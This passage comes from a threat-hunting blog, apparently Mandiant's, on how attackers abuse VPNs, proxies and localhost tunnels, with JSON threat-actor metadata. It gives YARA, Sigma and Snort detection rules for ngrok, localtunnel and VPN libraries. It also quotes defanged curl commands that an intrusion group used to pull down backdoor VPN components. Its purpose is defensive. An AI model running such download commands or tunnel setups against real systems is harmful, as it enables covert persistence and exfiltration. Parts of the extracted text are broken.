custom non-malicious binaries (ngrok, lt) to implement the tunnel. This hinders detection of abuse because detection leans towards methodology and not binary identification.\n\n Direction: LocalHost Tunnels typically use unique and moderately identifiable structure of process commandlines, this allows for to detection opportunities.\n\n LocalHost Tunnel Commandlines\n\n Localhost Tunnel Host Commands (METHODOLOGY)\ntitle: 'Localhost Tunnel Host Commands (METHODOLOGY)'\ndescription: 'Detect potential localhost tunnel\ncommandlines.'\nauthor: Mandiant\ndate: '2022-06-15'\nstatus: hunting\nlogsource:\n  product: 'FireEye HX'\ndetection:\n  selectionKnownCMDs:\n    processEvent processCmdLine|re:\n      - 'ngrok\\s+\n(http|tcp|tls|start)\\s+'\n      - 'lt\\s+--port\\s+[0-9]{1,5}'\n      - 'gotunnelme\\s+[0-9]{1,5}'\n  selectionNgrokProcess:\n    processEvent processCmdLine|contains: \"ngrok\"\n  selectionNgrokCMD:\n    processEvent processCmdLine|contains:\n      - 'http '\n      - 'tls '\n      - 'tcp\n'\n      - 'start '\n  selectionLHRun1:\n    processEvent processCmdLine|contains: \"ssh\"\n \n\n```\n\n-----\n\n```\n               p p |\nprocessEvent processCmdLine|contains: \"localtunnel\"\n  selectionLocalTunnel2:\n    processEvent\nprocessCmdLine|contains: \"--port\"   selectionLocalTunnel3:\n    processEvent processCmdLine|contains:\n      - \"/lt\"\n      - \"\\lt\"\n      - \" lt\"\n  selectionLocalTunnel4:\n    processEvent\nprocessCmdLine|contains:\n      - \" http\"\n      - \" https\"\n  selectionLocalTunnel5:\n   \nprocessEvent processCmdLine|contains:\n      - \"-s\"\n      - \"--server\"\n      - \"-h\"\n      - \"--host\"\n      - \"-p\"\n      - \"--port\"          condition:\nselectionKnownCMDs or (selectionNgrokProcess and selectionNgrokCMD) or (selectionLHRun1 and selectionLHRun2\nand selectionLHRun3) or ((selectionLocalTunnel1 or selectionLocalTunnel3) and selectionLocalTunnel2) or\n(selectionLocalTunnel1 and selectionLocalTunnel4 and selectionLocalTunnel5)\nfields:\n  - \"processEvent\nprocessCmdLine\"\n  - \"processEvent Process\"\n  - \"processEvent Username\"\n  - \"processEvent Md5\"\nfalsepositives:\n  - \"Unknown\"\nlevel: \"medium\"\n\n#### Ngrok Agent IPs in Network Traffic\n\n Historically, Ngrok’s tunneling protects origin servers by hiding the origin IPs. However, the origin IPs for all free endpoints are exposed in the ngrok-agent-ips header on all HTTP responses returned by the tunnel endpoint. This can easily be hunted for and detected via Snort to better label and understand network session data.\nalert tcp any any -> any any ( msg:\"M.Tunneler.HTTP.Ngrok.[response]\"; content:\"HTTP/1\"; depth:6;\ncontent:\"200 OK\"; within:9; content:\"|0d0a|ngrok-agent-ips:\"; threshold:type limit,track by_src,count\n1,seconds 1800; sid:1; rev:1; )\n\n Other Generic Directions\n\n Files that contain common VPN equities\n\n Concern: Adversaries may use modified binaries to interact with VPN infrastructure. This more general direction allows for a comprehensive look into potential VPN-like behavior.\n\n Direction: Identify core binary components that are not so easily modified to match on (i.e. PDB paths, exports, third-party libraries, domains, etc)\n\n Generic Domains in Binaries\nrule M_Hunting_VPNEngine_GenericProxyVPNDomain_1\n{\n  meta:\n    author = \"Mandiant\"\n   \ndescription = \"Rule looks for generic proxy/vpn domains.\"\n    md5 = \"96842ad6cc00fab5776171c56812b9a5\"\n  strings:\n    $UniqueProxyVPNDomain = /(proxy|vpn)\\.[^\\.]{1,100}\\.(net|com|org)/ ascii fullword\nnocase\n  condition:\n    filesize < 5MB and ((uint16(0) == 0x5a4d and uint32(uint32(0x3C)) ==\n0x00004550) or (uint32(0) == 0x464c457f)) and $UniqueProxyVPNDomain\n}\n\n ConventionEngine\n\n As documented in the Definitive Dossier of Devilish Debug Details: Part One:\n\n “Often users name folders and files based on their content. Computers force users to label and annotate their data based on the data type, role, and purpose. This human-computer convention means that most digital content has some descriptive surface area, or descriptive “features” that are present in many files, including malware files…. Not all these features were meant to be in [a binary], and they were certainly not intended for defenders to notice. This is especially true for PDB paths, which can be described as an outcome of the compilation process, a toolmark left in malware that describes the development environment.”\n\n VPN or Proxy PDB Convention\nrule M_Hunting_Win_VPNEngine_PDB_1\n{\n  meta:\n    author = \"Mandiant\"\n    description = \"Rule\nlooks for VPN or Proxy PDB.\"\n    md5 = \"2bf422e19e721b461f9e98271fb28ad3\"\n  strings:\n    $pdb =\n/RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,500}(vpn|proxy)[\\x00-\\xFF]{0,500}\\.pdb\\x00/ ascii nocase wide\n  condition:\n    filesize < 5MB and uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and\n$pdb\n}\n\n Hunting 3rd Party Libraries\n\n While some products are more popular than others, there are countless VPN software companies and products. Therefore, relying on specific brand detections is not suitable for purposes of wide detections. Hence, detection on popular third-party libraries that these software use at scale would allow a broader and more inclusive scope. Some of these third-party tunnel libraries include gotunnelme, golocaltunnel, localtunnel.net, and zdtun.\n\n```\n\n-----\n\n#### GoTunnelMe Library\n```\nrule M_Hunting_AscensionEngine_gotunnelme_1\n{\n  meta:\n    author = \"Mandiant\"\n    description =\n\"Rule looks for binaries that use gotunnelme.\"\n    md5 = \"35fcc4b19946d1bc9c21add1f42d2b63\"\n \nstrings:\n    $anchor = \"gotunnelme\" ascii nocase wide\n    $func1 = \"NewTunnelConn\" ascii nocase\nwide\n    $func2 = \"Tunnel\" ascii nocase wide\n    $func3 = \"StopTunnel\" ascii nocase wide\n        $func4 = \"ConnectRemote\" ascii nocase wide             $func5 = \"NewTunnel\"\nascii nocase wide\n        $func6 = \"GetUrl\" ascii nocase wide\n  condition:\n     ((uint16(0) ==\n0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and filesize < 20MB and\n$anchor and (1 of ($func*))\n}\n\n GoLocalTunnel Library\nrule M_Hunting_AscensionEngine_golocaltunnel_1\n{\n  meta:\n    author = \"Mandiant\"\n    description\n= \"Rule looks for binaries that use golocaltunnel.\"\n    md5 = \"35fcc4b19946d1bc9c21add1f42d2b63\"\n \nstrings:\n    $anchor1 = \"localtunnel.go\" ascii nocase wide\n        $func1 = \"readAtmost\" ascii\nnocase wide\n        $func2 = \"Network\" ascii nocase wide\n        $func3 = \"WaitFor\" ascii\nnocase wide\n        $func4 = \"Accept\" ascii nocase wide\n        $func5 = \"Addr\" ascii nocase\nwide\n        $func6 = \"URL\" ascii nocase wide\n        $func7 = \"ReachedEOF\" ascii nocase wide\n        $func8 = \"setDefaults\" ascii nocase wide\n  condition:\n     ((uint16(0) == 0x5A4D and\nuint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and filesize < 20MB and $anchor1 and (3\nof ($func*))\n}\n\n LocalTunnelNet Library\nrule M_Hunting_AscensionEngine_localtunnelnet_1\n{\n  meta:\n    author = \"Mandiant\"\n   \ndescription = \"Rule looks for binaries that use localtunnel.net.\"\n    md5 =\n\"35fcc4b19946d1bc9c21add1f42d2b63\"\n  strings:\n        $s1 = \"Localtunnel\" ascii nocase wide\n        $s2 = \"LocaltunnelClient\" ascii nocase wide\n        $s3 = \"ProxiedSslTunnelOptions\"\nascii nocase wide\n        $s4 = \"ProxiedSslTunnelConnection\" ascii nocase wide\n  condition:\n     ((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and\nfilesize < 20MB and all of them\n}\n\n ZDTun Library\nrule M_Hunting_AscensionEngine_zdtun_1\n{\n  meta:\n    author = \"Mandiant\"\n    description = \"Rule\nlooks for binaries that use zdtun.\"\n    md5 = \"f224e0c1ad6d27c76b1f87fdb8ada639\"\n  strings:\n        $anchor = \"zdtun\" ascii nocase wide\n        $s1 = \"zdtun_conn_close\" ascii nocase\nwide\n        $s2 = \"zdtun_conn_dnat\" ascii nocase wide\n        $s3 = \"zdtun_conn_proxy\" ascii\nnocase wide\n        $s4 = \"zdtun_conn_set_userdata\" ascii nocase wide\n        $s5 =\n\"zdtun_fds\" ascii nocase wide\n        $s6 = \"zdtun_finalize\" ascii nocase wide\n        $s7 =\n\"zdtun_get_stats\" ascii nocase wide\n        $s8 = \"zdtun_make_iphdr\" ascii nocase wide\n      \n $s9 = \"zdtun_purge_expired\" ascii nocase wide\n        $s10 = \"zdtun_set_dnat_info\" ascii nocase\nwide\n        $s11 = \"zdtun_set_mtu\" ascii nocase wide\n        $s12 = \"zdtun_set_socks5_proxy\"\nascii nocase wide\n        $s13 = \"zdtun_conn_get_userdata\" ascii nocase wide\n        $s14 =\n\"zdtun_userdata\" ascii nocase wide\n        $s15 = \"zdtun_init\" ascii nocase wide\n  condition:\n     ((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and\nfilesize < 20MB and $anchor and (5 of ($s*))\n}\n\n Generic Proxy, Tunnel, or VPN Library via Github\nrule M_Hunting_AscensionEngine_GithubVPNProxy_1\n{\n  meta:\n    author = \"Mandiant\"\n   \ndescription = \"Rule looks for binaries that include vpn/proxy/tunnel github links\"\n  strings:\n    $r1\n= /github.com\\/[^\\/]+\\/[^\\/]*(vpn|VPN|proxy|Proxy|tunnel|Tunnel)[^\\/]*\\//\n    $vpn = \"vpn\" nocase\nfullword\n    $proxy = \"proxy\" nocase fullword\n    $tunnel = \"tunnel\" nocase fullword\n  condition:\n     ((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and\nfilesize < 20MB and $r1 and ($vpn or $proxy or $tunnel)\n}\n\n### Binary Export Artifacts\n\n#### Based on Microsoft documentation, DLL files contain an exports table. The exports table includes the name of every function that the DLL exports to other executables. These functions are the entry points into the DLL; only the functions in the exports table can be accessed by other executables.\n\n These export equities within files may help identify intent, especially as it pertains to unique exports and the goal with their use. There are other unique portable executable details that allow for insight into possible intent, including resource names and domain presence.\n\n VPN Specific DLL Exports\n\n```\n\n-----\n\n```\n  p p _ g_ _ p g _ p _ _ {\ndescription = \"Looks for an export dll containing the string vpn\"\n    reference =\n\"https://twitter.com/stvemillertime/status/1241027937970814976?s=20&t=t2Esf89F6T8LuiBsT8RV-g\"\n    md5 =\n\"61d59eb2799b1a77eedf34b145cf23e1\"\n    strings:\n        $pcre = /[\\x00-\\x7F]{0,100}(vpn|VPN)\n[\\x00-\\x7F]{0,100}\\.(dat|dll|sys|exe)\\x00/\n    condition:\n        uint16(0) == 0x5A4D and\nuint32(uint32(0x3C)) == 0x00004550 and $pcre at\npe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)\n+ 12))\n}\n\n#### Proxy Specific DLL Exports\nimport \"pe\"\nrule M_Hunting_Win_ExportEngine_vpn_dll_1\n{\n    meta:\n    author = \"Mandiant\"\n   \ndescription = \"Looks for an export dll containing the string vpn\"\n    reference =\n\"https://twitter.com/stvemillertime/status/1241027937970814976?s=20&t=t2Esf89F6T8LuiBsT8RV-g\"\n    md5 =\n\"61d59eb2799b1a77eedf34b145cf23e1\"\n    strings:\n        $pcre = /[\\x00-\\x7F]{0,100}\n(proxy|Proxy|PROXY)[\\x00-\\x7F]{0,100}\\.(dat|dll|sys|exe)\\x00/\n    condition:\n        uint16(0)\n== 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at\npe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)\n+ 12))\n}\n\n VPN or Proxy Specific PE Resource Names\nimport \"pe\"\nrule M_Hunting_Win_VPNEngine_ResourceInPE_1\n{\n  meta:\n    author = \"Mandiant\"\n   \ndescription = \"This signature is looking for VPN or Proxy subresources.\"\n    md5 =\n\"2ce7a0ffa14134167945e8df84755f1c\"\n  condition:\n    uint16(0) == 0x5A4D and uint32(uint32(0x3C)) ==\n0x00004550 and for any i in (0.. pe.number_of_resources - 1): ( pe.resources[i].name_string ==\n\"V\\x00P\\x00N\\x00\" or pe.resources[i].name_string == \"P\\x00R\\x00O\\x00X\\x00Y\\x00\" or\npe.resources[i].name_string == \"VPN\" or pe.resources[i].name_string == \"PROXY\")\n\n## Impact - A Case Study\n\n#### As analysts, researchers, engineers, etc. - time is limited. Time is one of the greatest resources that anyone has. So, it’s important to ask the question: Why care? Well, the following sections will highlight a variety of adversaries abusing the techniques and technologies discussed in this blog.\n\n### UNC3500\n\n#### UNC3500 is a suspected Chinese actor that has leveraged CVE-2021-44228 to target entities in the education and telecommunications sectors. The group has established persistence by creating a VPN and HTTPS server that can function as a backdoor following initial compromise. Following reconnaissance and initial actions in a specific UNC3500 intrusion the attackers proceeded to download the aforementioned VPN software and HTTPS server using the following commands:\n\n curl hxxp://35.189.145[.]119/hamcore.se2 > /mi/pki/mics/log/hamcore.se2\n (MD5: 9fb1191ba0064d317a883677ce568023) curl hxxp://35.189.145[.]119/https > /mi/pki/mics/log/https\n (MD5: 00352d167c44272dba415c36867a8125) curl hxxp://35.189.145[.]119/vpn_bridge.config > /mi/pki/mics/log/vpn_bridge.config\n (MD5: ce5d96252315e2c9d5fd9aeb98ae28ae)\n\n The https and hamcore.se2 files are components of SoftEther’s VPN server bridge, PacketiX. The PacketiX VPN Bridge creates a layer 2 connection between a physical network adapter on a local system and a remote SoftEther VPN server. It requires an accompanying library file hamcore.se2 and a configuration file vpn_bridge.config. By deploying this package, UNC3500 established persistence on the compromised server.\n\n### APT40\n\n#### APT40 primarily carries out intrusion activities against maritime industries and has been linked to activity dating back to at least 2013. In April 2021, four members of APT40 were indicted by the U.S. Department of Justice, alleged to be working on behalf of the MSS in Hainan. Operations may target sensitive data that would benefit research and development programs, inform decision makers sponsoring these actors, and enable further targeting of related organizations.\n\n One methodology observed being used by APT40 includes exfiltration via VPN. Additionally, APT40 has been identified utilizing ProtonVPN and ExpressVPN.\n\n```\n\n-----\n\n### UNC2465\n\n#### In a Supply Chain intrusion, SMOKEDHAM, a lightweight .NET-based backdoor used by UNC2465, used PowerShell to connect to third-party file sharing sites to download an Ngrok utility that was renamed conhost.exe. A script was used to execute Ngrok with a configuration file named ngrok.yml. Ngrok is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.\n\n UNC2465 is a threat cluster that has previously deployed DARKSIDE ransomware and is suspected to have been active since at least March 2020. UNC2465 activity is characterized by their ongoing use of similar tactics, techniques, and procedures (TTPs) to distribute the publicly available PowerShell-based SMOKEDHAM backdoor in victim environments. UNC2465 has extorted using a hybrid approach of DARKSIDE ransomware and extortion through a leaks website over TOR. DARKSIDE applies pressure initially through shaming a victim with a small amount of data published on a the DARKSIDE blog followed by larger releases of data lasting several days if a client won't pay. This group likely represents an affiliate, only a smaller part of overall DARKSIDE ecosystem. UNC2465 has used phishing, web compromises, and supply chain access through the trojanization of legitimate software installers. UNC2465 activities have continued past the overall shutdown of DARKSIDE RaaS.\n\n Underground Forums\n\n An English-speaking actor named 'idk' advertised access to U.S. Insurance and Healthcare companies in which the method of access listed was “OpenVPN installed” and “credentials from OpenVPN”.\n\n VPNs as Sources\n\n UNC3661 has used NordVPN to hide origin IPs for their remote interactions with victim environments.\n\n A NEARTWIST cluster of activity used against Ukraine (linked to APT28 with moderate confidence) logged in to web shells using ExpressVPN IP addresses.\n\n### Prevalence\n\n#### A Jedi Master once said, “Prevalence is the number one thing analysts want”. So let's talk prevalence! Utilizing the various detections and methods highlighted in this blog against housed Mandiant data, 40+ connections were made to different adversary groups and malware families.\n\n\n-----\n\n#### Adversary Clusters and Groups\n\n APT12\n\n APT22\n\n APT28\n\n APT37\n\n APT40\n\n UNC270\n\n UNC530\n\n UNC875\n\n UNC961\n\n UNC1066\n\n UNC1575\n\n UNC1585\n\n UNC1615\n\n UNC1804\n\n UNC2465\n\n UNC2984\n\n UNC3325\n\n UNC3500\n\n UNC3661\n\n UNC3804\n\n## Where Did We Go?\n\n\n#### Malware Families and Exploits\n\n BEACON\n BEEBSINFO\n DARKNEURON\n DIMCLERK\n EMOTET\n HALFSPOT\n HIDEYHOLE\n HTRAN\n ICEFOG\n IRONGATE\n KICKBACK\n LOKIBOT METERPRETER\n MONEYRUN\n PACMAN\n PISCES\n PROXYDLL\n RICHBOAT\n SALSAVERDE\n SODARIVER\n SOGU\n TRICKBOT\n VENOMPROXY\n WMIEXEC\n WSHRAT\n ZXSHELL\n CVE-2018-0802\n\n\n#### The use of VPN software, proxy services, and localhost tunnels provide adversaries an air of legitimacy, detection bypass via encryption, and potential point to point access. These characteristics are high value desires of an adversary, and make detection, containment, and eradication more burdensome on the blue team.\n\n However, in this blog VPN software, proxy services, and localhost tunnels were analyzed for hunting directions. These hunting directions did include vendor and service specific items (SoftEther, Ngrok, WireGuard, OpenVPN, Hide.Me, etc.), but also focused on wholistic and tradecraft-related directions (Conventions, 3rd Party Libraries, PE Artifacts, etc.).\n\n These directions will expand the defender’s hunting and detection repertoire against these software and service suites, lowing the burden on the blue team.\n\n Happy Hunting\n\n Acknowledgements\n\n Thanks to everyone that contributed analysis and review. Special thanks to Matthew Dunwoody and Evan Reese.\n\n Disclaimer\n\n The signatures documented in this blog are meant to be threat hunting directions and jump-points – empowering the analyst to take the next step down the rabbit hole and identify suspicious activity. Every network is different and because of that, these signatures should not be deployed in production environments without testing and, when required, tuning.\n\n\n-----\n\n#### Case studies and examples are drawn from our experiences and activities working for a variety of customers, and do not represent our work for any one customer or set of customers. In many cases, facts have been changed to obscure the identity of our customers and individuals associated with our customers.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-29 - Burrowing your way into VPNs, Proxies, and Tunnels.pdf"
    ],
    "report_names": [
        "2022-06-29 - Burrowing your way into VPNs, Proxies, and Tunnels.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d9dfc61-6138-497a-b9da-33885539f19c",
            "created_at": "2022-10-25T16:07:23.720008Z",
            "updated_at": "2025-03-27T02:02:09.944484Z",
            "deleted_at": null,
            "main_name": "Icefog",
            "aliases": [
                "ATK 23",
                "Dagger Panda",
                "Icefog",
                "Red Wendigo"
            ],
            "source_name": "ETDA:Icefog",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Dagger Three",
                "Fucobha",
                "Icefog",
                "Javafog",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d18fe42c-8407-4f96-aee0-a04e6dce219a",
            "created_at": "2023-01-06T13:46:38.275292Z",
            "updated_at": "2025-03-27T02:00:02.79092Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "Calc Team",
                "IXESHE",
                "BRONZE GLOBE",
                "BeeBus",
                "DynCalc",
                "DNSCalc",
                "Crimson Iron",
                "NUMBERED PANDA",
                "TG-2754",
                "Group 22"
            ],
            "source_name": "MISPGALAXY:APT12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1aead86d-0c57-4e3b-b464-a69f6de20cde",
            "created_at": "2023-01-06T13:46:38.318176Z",
            "updated_at": "2025-03-27T02:00:02.803684Z",
            "deleted_at": null,
            "main_name": "DAGGER PANDA",
            "aliases": [
                "IceFog",
                "RedFoxtrot",
                "Red Wendigo",
                "PLA Unit 69010"
            ],
            "source_name": "MISPGALAXY:DAGGER PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6a660ea2-1118-404a-9f8f-f0d6a1e9f184",
            "created_at": "2022-10-25T15:50:23.685924Z",
            "updated_at": "2025-03-27T02:00:55.52357Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "APT12",
                "IXESHE",
                "DynCalc",
                "Numbered Panda",
                "DNSCALC"
            ],
            "source_name": "MITRE:APT12",
            "tools": [
                "Ixeshe",
                "RIPTIDE",
                "HTRAN"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "056826cb-6e17-4954-a9b4-2cc8c6ae3cb8",
            "created_at": "2023-03-04T02:01:54.115678Z",
            "updated_at": "2025-03-27T02:00:03.125249Z",
            "deleted_at": null,
            "main_name": "Prophet Spider",
            "aliases": [
                "GOLD MELODY",
                "UNC961"
            ],
            "source_name": "MISPGALAXY:Prophet Spider",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7b039cc0-33b6-495a-b4ca-649d096b993d",
            "created_at": "2023-01-06T13:46:38.482654Z",
            "updated_at": "2025-03-27T02:00:02.845093Z",
            "deleted_at": null,
            "main_name": "APT22",
            "aliases": [
                "BRONZE OLIVE",
                "Group 46",
                "G0039",
                "Suckfly"
            ],
            "source_name": "MISPGALAXY:APT22",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "16f2436b-5f84-44e3-a306-f1f9e92f7bea",
            "created_at": "2023-01-06T13:46:38.745572Z",
            "updated_at": "2025-03-27T02:00:02.907444Z",
            "deleted_at": null,
            "main_name": "APT40",
            "aliases": [
                "ISLANDDREAMS",
                "TEMP.Jumper",
                "BRONZE MOHAWK",
                "GADOLINIUM",
                "KRYPTONITE PANDA",
                "TA423",
                "MUDCARP",
                "Gingham Typhoon",
                "TEMP.Periscope",
                "G0065",
                "ATK29",
                "Red Ladon",
                "ITG09"
            ],
            "source_name": "MISPGALAXY:APT40",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "59be3740-c8c7-47aa-84c8-e80d0cb7ea3a",
            "created_at": "2022-10-25T15:50:23.481057Z",
            "updated_at": "2025-03-27T02:00:55.480695Z",
            "deleted_at": null,
            "main_name": "Leviathan",
            "aliases": [
                "MUDCARP",
                "Kryptonite Panda",
                "Gadolinium",
                "BRONZE MOHAWK",
                "TEMP.Jumper",
                "APT40",
                "TEMP.Periscope",
                "Gingham Typhoon"
            ],
            "source_name": "MITRE:Leviathan",
            "tools": [
                "Windows Credential Editor",
                "BITSAdmin",
                "HOMEFRY",
                "Derusbi",
                "at",
                "BLACKCOFFEE",
                "BADFLICK",
                "gh0st RAT",
                "PowerSploit",
                "MURKYTOP",
                "NanHaiShu",
                "Orz",
                "Cobalt Strike",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e6e26922-3f4f-4243-9af5-cf9bea8b93bd",
            "created_at": "2022-10-25T16:47:55.577163Z",
            "updated_at": "2025-03-27T02:05:17.26824Z",
            "deleted_at": null,
            "main_name": "BRONZE GLOBE",
            "aliases": [
                "CTG-8223 ",
                "DNSCalc",
                "DyncCalc",
                "Numbered Panda ",
                "APT12 "
            ],
            "source_name": "Secureworks:BRONZE GLOBE",
            "tools": [
                " BeepService",
                " Etumbot",
                " Gh0st RAT",
                " Ixeshe",
                " Mswab",
                " RAdmin",
                " Seatran",
                " SvcInstaller",
                " Ziyang",
                "Badpuck"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "1d0f389f-2f6c-415d-91f4-633bd6c645f7",
            "created_at": "2024-05-01T02:03:07.974188Z",
            "updated_at": "2025-03-27T02:05:17.280317Z",
            "deleted_at": null,
            "main_name": "BRONZE OLIVE",
            "aliases": [
                "Barista",
                "Group 46 ",
                "Suckfly ",
                "APT22 "
            ],
            "source_name": "Secureworks:BRONZE OLIVE",
            "tools": [
                " DestroyRAT",
                " PlugX",
                " TCP/ICMP RAT",
                "Angryrebel"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "236a8303-bf12-4787-b6d0-549b44271a19",
            "created_at": "2024-06-04T02:03:07.966137Z",
            "updated_at": "2025-03-27T02:05:17.410356Z",
            "deleted_at": null,
            "main_name": "IRON TILDEN",
            "aliases": [
                "Aqua Blizzard ",
                "Armageddon",
                "Blue Otso ",
                "BlueAlpha ",
                "Dancing Salome ",
                "Gamaredon",
                "Gamaredon Group",
                "Hive0051 ",
                "Primitive Bear ",
                "Shuckworm ",
                "Trident Ursa ",
                "UAC-0010 ",
                "UNC530 ",
                "WinterFlounder ",
                "ACTINIUM "
            ],
            "source_name": "Secureworks:IRON TILDEN",
            "tools": [
                "Pterodo"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "47b52642-e5b8-4502-b714-b625002d86aa",
            "created_at": "2024-06-19T02:03:08.086579Z",
            "updated_at": "2025-03-27T02:05:17.385492Z",
            "deleted_at": null,
            "main_name": "GOLD MELODY",
            "aliases": [
                "UNC961",
                "PROPHET SPIDER"
            ],
            "source_name": "Secureworks:GOLD MELODY",
            "tools": [
                " 7-ZIP",
                " AUDITUNNEL",
                " BURP Suite",
                " GOTROJ",
                " JSP webshells",
                " Mimikatz",
                " Wget",
                "7-ZIP"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
